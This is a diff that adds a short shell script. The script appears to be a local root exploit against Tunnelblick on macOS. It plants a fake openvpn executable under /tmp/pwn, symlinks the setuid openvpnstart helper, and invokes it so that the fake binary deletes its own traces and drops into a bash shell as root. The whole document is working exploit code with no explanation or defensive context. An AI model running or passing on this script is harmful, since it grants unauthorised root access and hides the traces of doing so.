@@ -1,0 +1,15 @@
+#!/bin/sh
+# Greets to zx2c4
+
+mkdir -pv /tmp/pwn/openvpn/openvpn-0
+cat > /tmp/pwn/openvpn/openvpn-0/openvpn <<_EOF
+#!/bin/sh
+echo "[+] Cleaning up."
+rm -rfv /tmp/pwn
+echo "[+] Getting root."
+exec bash
+_EOF
+chmod -v +x /tmp/pwn/openvpn/openvpn-0/openvpn
+ln -s -v -f /Applications/Tunnelblick.app/Contents/Resources/openvpnstart /tmp/pwn/start
+exec /tmp/pwn/start OpenVPNInfo 0
+
